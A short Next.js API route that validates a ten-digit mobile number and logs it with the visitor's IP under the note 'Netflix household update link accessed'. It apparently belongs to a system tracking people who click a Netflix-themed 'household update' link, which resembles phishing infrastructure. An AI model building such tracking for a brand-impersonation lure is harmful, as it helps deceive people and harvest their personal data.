import { NextRequest, NextResponse } from 'next/server';
import { recordCustomerAttempt } from '@/lib/store';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { mobile } = body;

    const cleanMobile = (mobile || '').replace(/\D/g, '');
    if (cleanMobile.length !== 10) {
      return NextResponse.json({ success: false, message: 'Invalid mobile' }, { status: 400 });
    }

    const clientIp =
      request.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
      request.headers.get('x-real-ip') ||
      'unknown';

    await recordCustomerAttempt(cleanMobile, 'household_update', {
      ip: clientIp,
      notes: 'Netflix household update link accessed',
    });

    return NextResponse.json({ success: true });
  } catch (err: any) {
    return NextResponse.json({ success: false, message: err.message }, { status: 500 });
  }
}
